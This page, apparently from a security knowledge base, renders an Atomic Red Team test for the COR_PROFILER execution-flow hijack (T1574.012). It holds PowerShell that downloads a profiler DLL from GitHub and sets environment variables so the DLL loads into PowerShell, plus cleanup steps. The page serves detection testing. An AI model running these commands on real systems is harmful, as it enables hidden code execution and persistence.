---
atomic_guid: "79d57242-bbef-41db-b301-9d01d9f6e817"
title: "Registry-free process scope COR_PROFILER"
framework: "atomic"
generated: "true"
attack_technique_id: "T1574.012"
attack_technique_name: "Hijack Execution Flow: COR_PROFILER"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "79d57242-bbef-41db-b301-9d01d9f6e817"
  - "Registry-free process scope COR_PROFILER"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Registry-free process scope COR_PROFILER

Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

## Metadata

- Atomic GUID: 79d57242-bbef-41db-b301-9d01d9f6e817
- Technique: T1574.012: Hijack Execution Flow: COR_PROFILER
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1574.012/T1574.012.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1574-hijack_execution_flow|T1574.012]]

## Input Arguments

### clsid_guid

- description: custom clsid guid
- type: string
- default: {09108e71-974c-4010-89cb-acf471ae9e2c}

### file_name

- description: unamanged profiler DLL
- type: path
- default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll

## Dependencies

"#{file_name}" must be present

### Prerequisite Check

```powershell
if (Test-Path "#{file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
```

## Executor

- name: powershell

### Command

```powershell
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '"#{file_name}"'
POWERSHELL -c 'Start-Sleep 1'
```

### Cleanup

```powershell
$env:COR_ENABLE_PROFILING = 0
$env:COR_PROFILER = ''
$env:COR_PROFILER_PATH = ''
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.yaml)
